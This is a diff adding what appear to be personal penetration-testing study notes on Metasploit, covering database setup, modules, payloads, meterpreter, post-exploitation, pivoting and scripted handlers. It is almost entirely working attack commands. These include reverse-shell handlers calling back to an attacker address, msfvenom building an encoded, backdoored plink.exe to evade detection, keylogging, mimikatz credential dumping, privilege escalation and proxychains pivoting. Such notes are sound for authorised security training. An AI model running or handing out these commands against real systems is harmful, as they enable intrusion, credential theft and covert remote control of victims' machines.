@@ -1,0 +1,153 @@
+UI and setup
+
+sudo systemctl start postgresql
+sudo systemctl enable postgresql
+msfdb init
+
+sudo apt update; sudo apt install metasploit-framework
+
+show -h --> modules
+use name/of/the/module
+back / previous
+
+use scanner/portscan/tcp
+run
+
+services --> display discovered services
+services -p 123
+db_nmap 1.2.3.4 -A -Pn
+
+hosts --> display discovered hosts
+
+workspace --> organize your tests
+workspace test
+-a workspace_name --> add
+-d workspace_name --> delete
+
+===========================================================================
+Auxiliary modules
+
+show auxiliary
+search type:auxiliary name:smb
+
+ creds --> info re successful login attempts
+
+===========================================================================
+exploit modules
+after setting LHOST & RHOST we can check to verify whether target is vulnerable to selected module
+check
+
+===========================================================================
+payloads
+
+windows/shell_reverse_tcp - non staged; payload is sent in its entirety along with the exploit
+windows/shell/reverse_tcp - staged; usually payload sent in two parts; first part contains a small primary payload that causes the target to connect back
+then attacker transfers larger secondary payload containing the rest of shellcode to execute it
+
+
+search meterpreter type:payload
+help
+sysinfo
+getuid
+upload /usr/share/windows-resources/binaries/nc.exe c:\\dest\\path
+download "c:\windows\system32\calc.exe" /tmp/calc.exe
+shell
+
+msfvenom cheat sheet --> https://book.hacktricks.xyz/generic-methodologies-and-resources/shells/msfvenom
+
+generate -f exe -e x86/shikata_ga_nai -i 9 -x /usr/share/windows-resources/binaries/plink.exe -o shell_reverse_msf_encoded_embedded.exe
+
+use multi/handler
+set payload windows/meterpreter/reverse_https
+
+exploit -j --> will run module as background job
+jobs
+jobs -i 0
+kill 0
+
+
+msfvenom -l formats --> review executable formats
+
+show advanced
+set EnableStageEncoding true
+set StageEncoder x86/shikata_ga_nai
+
+
+set AutoRunScript windows/gather/enum_logged_on_users --> automatically run a script when a meterpreter connection is established
+background
+
+transport --> we can switch protocols after initial compromise
+transport list --> list transports
+transport add --> add new transport protocol to the current session
+
+transport add -t reverse_tcp -l 1.2.3.4 -p 1234
+===========================================================================
+build your own MSF module
+
+
+===========================================================================
+Post exploitation
+
+with meterpreter
+screenshot
+keylogger:
+keyscan_start
+keyscan_dump
+keyscan_stop
+
+migrating processes
+
+ps
+migrate 1234
+
+set SESSION 1 --> use an exploit module via meterpreter session
+
+load powershell
+help powershell
+powershell_execute "$PSVersionTable.PSVersion"
+
+load kiwi --> mimikatz
+getsystem
+creds_msv
+
+=====
+Pivoting
+
+ipconfig
+route add 192.168.1.0/24 11 --> 11 is session ID
+route print
+use auxiliary/scanner/portscan/tcp
+set
+run
+
+use multi/manage/autorotate --> will set up pivot routes automatically
+show options
+sessions -l
+set session 5
+exploit
+
+use auxiliart/server/socks4a --> socks proxy
+
+sudo echo "socks4 localhost 1080" >> /etc/proxychains.conf
+sudo proxychains rdesktop 1.2.3.4
+
+from a meterpreter
+portfwd -h
+portfwd add -l 3389 -p 3389 -r 192.168.1.1
+
+===============
+automation
+create a script setup.rc
+
+use exploit/multi/handler
+set PAYLOAD windows/meterpreter/reverse_https
+set LHOST 1.2.3.4
+set LPORT 443
+set EnableStageEncoding true
+set StageEncoder x86/shikata_ga_nai
+set AutoRunScript post/windows/manage/migrate 
+set ExitOnSession false
+exploit -j -z
+
+sudo msfconsole -r setup.rc
+
